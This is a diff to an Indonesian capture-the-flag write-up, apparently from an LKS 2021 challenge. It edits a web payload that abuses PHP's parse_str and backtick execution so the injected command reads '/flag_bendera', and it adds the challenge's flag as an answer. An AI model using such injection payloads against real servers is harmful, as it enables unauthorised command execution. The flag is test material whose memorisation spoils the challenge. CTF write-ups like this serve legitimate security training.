@@ -13,5 +13,8 @@ Wangy wangy wangy wangy wangy <br>
 - Kita bisa membuat variabel baru menggunakan parse_str, sehingga payload akan kita masukan di query string
 - Hasil payload:
   ```
-  http://localhost:3000/?name='.`$a`;'&filter=%2F.%2A%2F&a=id
+  http://localhost:3000/?name='.`$a`;'&filter=%2F.%2A%2F&a=cat /flag_bendera
   ```
+
+## Flag
+LKS2021{parse_str_wangy_wangy_gws_gan}
